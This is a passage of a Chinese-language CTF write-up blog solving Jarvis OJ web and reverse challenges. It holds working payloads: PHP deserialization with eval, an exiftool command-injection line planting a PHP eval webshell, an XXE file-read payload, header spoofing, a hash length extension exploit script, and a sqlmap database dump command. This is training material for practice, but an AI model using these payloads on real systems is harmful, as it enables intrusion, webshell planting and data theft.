<span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]]</div><div class="line">r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>]</div><div class="line">o = np.array(o)</div><div class="line">r = np.array(r)</div><div class="line">x = np.linalg.solve(o,r)</div><div class="line"><span class="keyword">print</span> x</div><div class="line">string = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</div><div class="line">    string += chr(int(str(i)[<span class="number">0</span>:<span class="number">-2</span>]))</div><div class="line"><span class="keyword">print</span> string</div></pre></td></tr></table></figure><a id="more"></a><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>反序列化漏洞，比较新的一点是利用了php upload过程中的session来进行漏洞利用。</p><p>html构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure><p>几个payload </p><p><code>print_r(dirname(__FILE__));</code><br><code>print_r(scandir(dirname(__FILE__)));</code><br><code>print_r(file_get_contents(&quot;Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code><br>序列化payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</div><div class="line">session_start();</div><div class="line">class OowoO</div><div class="line">&#123;</div><div class="line">    public $mdzz;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function __destruct()</div><div class="line">    &#123;</div><div class="line">        eval($this-&gt;mdzz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$m = new OowoO();</div><div class="line">$m-&gt;mdzz = &quot;print_r(dirname(__FILE__));&quot;; </div><div class="line"></div><div class="line">echo serialize($m);</div><div class="line">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(__FILE__));&quot;;&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>ps: </p><p>参考资料<br>PHP Session 序列化及反序列化处理器 <a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>cve漏洞 imagick</p><p><code>exiftool -label=&quot;\&quot;|/usr/bin/id; \&quot;&quot; imagick.png</code></p><p>shell</p><p><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[a\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/1.php; \&quot;&quot; imagick.png</code></p><p><code>CTF{873dfee87823248f4a1657650204697a}</code></p><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>一开始一脸懵比。。。</p><p>原来是XXE攻击</p><p>payload一发带走</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;search&gt;name&lt;/search&gt;</div><div class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>考点：文件包含漏洞</p><p>1、泄露源码</p><p>但是关键字符被waf挡住了。</p><p>上传图片马</p><p><code>uploads/1497485980.gif</code></p><p>还是被waf拦截了，使用<code>&lt;script&gt;</code>绕过</p><p><code>CTF{upl0ad_sh0uld_n07_b3_a110wed}</code></p><h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>考察点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 127.0.0.1</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">X-Remote-IP: 127.0.0.1</div><div class="line">X-Remote-Addr: 127.0.0.1</div><div class="line">X-Client-IP: 127.0.0.1</div></pre></td></tr></table></figure></p><p>ssrf中ip.src的构建。</p><p>信息获取能力</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">robots.txt</div><div class="line">.index.php.swp</div><div class="line">.index.php.swo</div><div class="line">index.txt</div><div class="line">index.bak</div><div class="line">index.php~</div><div class="line">test.php</div><div class="line">index.phps</div><div class="line">phpinfo.php</div></pre></td></tr></table></figure><p>在robots.txt中找到线索。在burp repeater中，change action method 使get变成post，成功执行。</p><p><code>CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</code></p><h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>考察点：</p><p>信息获取能力</p><p>vim缓存文件恢复 <code>vim -r index.php</code></p><p>哈希长度扩展攻击</p><p>可利用工具：</p><p><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">https://github.com/iagox86/hash_extender</a></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,os,urllib</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">cmd = <span class="string">'./hash_extender -d ";\\"tseug\\":5:s" -s "3a4727d57463f122833d9e732f94e4e0" -a ";\\"nimda\\":5:s"  -f md5 --out-data-format=html -q -l '</span>+str(x)</div><div class="line"><span class="comment"># print cmd</span></div><div class="line">p = os.popen(cmd).read()</div><div class="line"><span class="comment"># break</span></div><div class="line">url = <span class="string">"http://web.jarvisoj.com:32778/"</span></div><div class="line">payload = <span class="string">"__cfduid=d08f46c0f9fbc7e86bab05b2d091bb7c81496549709; UM_distinctid=15c715066e3a8a-0f985be0b8ac06-5393662-1fa400-15c715066e4104b; "</span></div><div class="line">payload += <span class="string">"hsh="</span>+p[:<span class="number">32</span>]+<span class="string">";"</span></div><div class="line"></div><div class="line">payload +=<span class="string">"role="</span>+urllib.quote(urllib.unquote(p[<span class="number">32</span>:])[::<span class="number">-1</span>])+<span class="string">";"</span></div><div class="line"><span class="comment"># print payload</span></div><div class="line"><span class="comment"># break</span></div><div class="line">head = &#123;<span class="string">"Cookie"</span>:payload&#125;</div><div class="line"></div><div class="line"></div><div class="line">data = requests.get(url=url,headers=head).content</div><div class="line"><span class="keyword">if</span> len(data) != <span class="number">210</span>:</div><div class="line"><span class="keyword">print</span> data</div></pre></td></tr></table></figure><p>参考资料：</p><p><a href="https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90" target="_blank" rel="external">https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90</a></p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>逆向思路。。gdb调试一波，拿到flag。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">//动态链接库路径</div><div class="line">#define LIB_CACULATE_PATH &quot;./udf.so&quot;</div><div class="line"></div><div class="line">//函数指针</div><div class="line">typedef int (*CAC_FUNC)();</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    void *handle;</div><div class="line">    char *error;</div><div class="line">    CAC_FUNC cac_func = NULL;</div><div class="line"></div><div class="line">    //打开动态链接库</div><div class="line">    handle = dlopen(LIB_CACULATE_PATH, RTLD_LAZY);</div><div class="line">    if (!handle) &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, dlerror());</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    //清除之前存在的错误</div><div class="line">    dlerror();</div><div class="line"></div><div class="line">    //获取一个函数</div><div class="line">    *(void **) (&amp;cac_func) = dlsym(handle, &quot;getflag&quot;);</div><div class="line">    if ((error = dlerror()) != NULL)  &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, error);</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line">    (*cac_func)();</div><div class="line">    dlclose(handle);</div><div class="line">    exit(EXIT_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line">gcc -rdynamic -o main main.c -ldl</div></pre></td></tr></table></figure><h3 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h3><p><code>sqlmap -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --data &quot;username=123&amp;password=123&quot; --tamper=space2comment -D injection --dump</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;web？&quot;&gt;&lt;a href=&quot;#web？&quot; class=&quot;headerlink&quot; title=&quot;web？&quot;&gt;&lt;/a&gt;web？&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; np&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;o = [[&lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;72&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;122&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;53&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;166&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;187&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;244&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;125&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;182&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;47&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;86&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;67&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;19&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;138&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;149&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;122&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;187&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;218&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;17&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;151&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;79&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;228&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;189&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;87&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;90&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;106&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;61&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;229&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;216&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;181&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;231&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;174&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;159&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;43&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;207&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;241&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;239&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;170&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;122&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;117&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;117&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;250&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;113&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;77&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;195&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;229&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;79&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;167&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;108&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;116&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;206&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;86&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;148&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;187&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;161&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;249&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;175&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;169&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;125&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;228&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;167&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;182&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;189&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;102&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;158&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;169&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;116&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;229&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;138&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;87&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;26&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;106&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;211&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;252&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, 